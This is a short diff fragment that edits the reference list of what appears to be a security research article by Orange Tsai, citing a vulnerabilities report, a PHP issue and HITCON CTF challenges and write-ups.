-```
-
-
-
-```
 [1] Orange Tsai, https://blog.orange.tw/about/
 
  [2] "2021 Top Routinely Exploited Vulnerabilities"
@@ -2220,7 +1665,8 @@ CTF journey - cheers to HITCON CTF and to 217!
  https://github.com/php/php-src/issues/10453
 
 [72] Orange Tsai, "HITCON CTF 2017 / Baby^H Master PHP 2017
- https://github.com/orangetw/My-CTF-Web-Challenges#
+ https://github.com/orangetw/My-CTF-Web-Challenges
+#
  babyh-master-php-2017
 
 [73] "HITCON2017-writeup整理", https://lorexxar.cn/2017/11/10/hitcon2017-
